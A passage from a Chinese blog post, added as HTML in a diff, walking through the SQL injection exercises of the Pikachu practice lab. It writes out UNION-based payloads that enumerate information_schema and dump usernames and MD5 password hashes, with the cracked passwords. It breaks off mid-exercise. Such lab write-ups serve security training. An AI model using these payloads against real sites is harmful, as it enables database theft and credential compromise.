@@ -1,0 +1,1016 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="儒道易行">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="4.SQL-Inject1.Sql Inject(SQL注入)概述Sql Inject(SQL注入)概述    在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。 一个严重的SQL注入漏洞，可能会直接导致一家公司破产！ SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pikachu靶场-SQL-Inject">
+<meta property="og:url" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/index.html">
+<meta property="og:site_name" content="儒道易行">
+<meta property="og:description" content="4.SQL-Inject1.Sql Inject(SQL注入)概述Sql Inject(SQL注入)概述    在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。 一个严重的SQL注入漏洞，可能会直接导致一家公司破产！ SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/371-96993420.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776381084.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776389013.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776398888.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776407617.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776419479.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776429488.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776454261.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776479015.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776486408.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776494561.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776502656.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776508648.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776515826.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776527333.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776556203.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776565747.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776585032.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776593549.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776602229.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776611358.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776618543.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776626963.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776641120.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776653328.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776660400.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776665253.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776675119.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776690016.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776699714.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776710300.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776730490.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776756951.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776771209.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776787251.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776800362.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776815219.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776830214.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776841358.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776848730.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776880909.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776891044.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776904572.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776918570.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776942656.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776947461.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776955984.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776965613.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776984371.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776993830.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777002626.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777009804.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777020269.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777036647.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777042794.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777053139.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777061961.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777068582.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777079777.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777086705.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777106196.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777111609.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777117741.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777128139.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777144459.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777152925.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777171479.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777179533.png">
+<meta property="og:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777187267.png">
+<meta property="article:published_time" content="2018-09-11T13:36:15.000Z">
+<meta property="article:modified_time" content="2022-12-25T05:20:37.153Z">
+<meta property="article:author" content="儒道易行">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://rdyx0.github.io/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/371-96993420.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Pikachu靶场-SQL-Inject - 儒道易行</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"rdyx0.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>儒道易行</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Pikachu靶场-SQL-Inject"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2018-09-11 21:36" pubdate>
+          2018年9月11日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          91 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Pikachu靶场-SQL-Inject</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="4-SQL-Inject"><a href="#4-SQL-Inject" class="headerlink" title="4.SQL-Inject"></a>4.SQL-Inject</h1><h2 id="1-Sql-Inject-SQL注入-概述"><a href="#1-Sql-Inject-SQL注入-概述" class="headerlink" title="1.Sql Inject(SQL注入)概述"></a>1.Sql Inject(SQL注入)概述</h2><p>Sql Inject(SQL注入)概述</p>
+<p>   在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。</p>
+<p>一个严重的SQL注入漏洞，可能会直接导致一家公司破产！</p>
+<p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p>
+<p>在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：</p>
+<p>1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；</p>
+<p>2.使用参数化（Parameterized Query 或 Parameterized Statement）；</p>
+<p>3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!</p>
+<h2 id="2-数字型注入-post"><a href="#2-数字型注入-post" class="headerlink" title="2.数字型注入(post)"></a>2.数字型注入(post)</h2><p>由题可知是数字型注入(post)</p>
+<p>查看代码，发现代码对id没有做任何过滤</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/371-96993420.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>点击查询抓包，</p>
+<p>id&#x3D;1’ 报错，可判断存在SQL注入</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>判断字段数</p>
+<p>id&#x3D;1 order by 3报错</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776381084.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>id&#x3D;1 order by 2有回显，所以字段数为2</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776389013.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>判断回显点，可以在1和2这两处位置，获得我们想要的信息</p>
+<p>id&#x3D;1 union select 1,2 </p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776398888.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>查看用户名和数据库名，可知用户名为root@localhost，数据库名为pikachu</p>
+<p>id&#x3D;1 union select user(),database()</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776407617.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind</p>
+<p>id&#x3D;1 union select 1,goup_concat(table_name) from information_schema.tables where table_schema&#x3D;’pikachu’</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776419479.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>查询数据表users中的字段</p>
+<p>USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password,level,id,username,password,level</p>
+<p>id&#x3D;1 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776429488.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>查询字段username和password的内容</p>
+<p>id&#x3D;1 union select group_concat(username),group_concat(password) from users</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776454261.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>对应账号和MD5加密的密码：</p>
+<p>admin：e10adc3949ba59abbe56e057f20f883e（123456）</p>
+<p>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）</p>
+<p>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
+<h2 id="3-字符型注入-get"><a href="#3-字符型注入-get" class="headerlink" title="3.字符型注入(get)"></a>3.字符型注入(get)</h2><p>由题可知是字符型注入(get)，可直接在url中的name参数后进行修改</p>
+<p>输入’点击查询，报错，判断存在SQL注入</p>
+<p>&#x2F;vul&#x2F;sqli&#x2F;sqli_str.php?name&#x3D;%27&amp;submit&#x3D;查询</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776479015.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>可以用– q对’进行闭合</p>
+<p>输入name&#x3D;’ or 1&#x3D;1– q,可查询出所有账户数据</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776486408.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>判断字段数</p>
+<p>‘ order by 2 – q</p>
+<p>有回显</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776494561.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>‘ order by 3 – q</p>
+<p>报错，所以字段数为2</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776502656.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>判断回显点,可以在1和2这两处位置，获得我们想要的信息</p>
+<p>‘ union select 1,2 – q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776508648.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>查看用户名和数据库名，可知用户名为root@localhost，数据库名为pikachu</p>
+<p>‘ union select user(),database() – q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776515826.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind</p>
+<p>‘ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’pikachu’ – q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776527333.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>查询数据表users中的字段 id,username,password,level,id,username,password</p>
+<p>‘ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ – q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776556203.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>查询字段username和password的内容</p>
+<p>‘ union select group_concat(username),group_concat(password) from users – q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776565747.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>对应账号和MD5加密的密码：</p>
+<p>admin：e10adc3949ba59abbe56e057f20f883e（123456）</p>
+<p>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）</p>
+<p>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
+<h2 id="4-搜索型注入"><a href="#4-搜索型注入" class="headerlink" title="4.搜索型注入"></a>4.搜索型注入</h2><p>由题可知是搜索型注入(get)，可直接在url中的name参数后进行修改</p>
+<p>输入’点击查询，报错，判断存在SQL注入</p>
+<p>&#x2F;vul&#x2F;sqli&#x2F;sqli_str.php?name&#x3D;%27&amp;submit&#x3D;查询</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776585032.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>可以用– q对’进行闭合</p>
+<p>输入name&#x3D;’ or 1&#x3D;1– q,可查询出所有账户数据</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776593549.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>判断字段数</p>
+<p>‘ order by 3 – q</p>
+<p>有回显</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776602229.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>‘ order by 4 – q</p>
+<p>报错，所以字段数为3</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776611358.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>判断回显点,可以在1,2,这三处位置，获得我们想要的信息</p>
+<p>‘ union select 1,2,3 – q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776618543.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>中间内容和字符型注入(get)类似，只是多了一个回显点，在此不再赘述</p>
+<p>直接查询字段username和password的内容</p>
+<p>‘ union select 1,group_concat(username),group_concat(password) from users – q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776626963.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>对应账号和MD5加密的密码：</p>
+<p>admin：e10adc3949ba59abbe56e057f20f883e（123456）</p>
+<p>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）</p>
+<p>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
+<h2 id="5-xx型注入"><a href="#5-xx型注入" class="headerlink" title="5.xx型注入"></a>5.xx型注入</h2><p>输入’报错，此处存在SQL注入漏洞，观察报错信息，出现)</p>
+<p>&#x2F;vul&#x2F;sqli&#x2F;sqli_str.php?name&#x3D;%27&amp;submit&#x3D;查询</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776641120.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>输入’)– q,成功闭合</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776653328.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>判断字段数</p>
+<p>‘) order by 2 – q</p>
+<p>有回显</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776660400.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>‘) order by 3 – q</p>
+<p>报错，所以字段数为2</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776665253.png" srcset="/img/loading.gif" lazyload alt="img"></p>
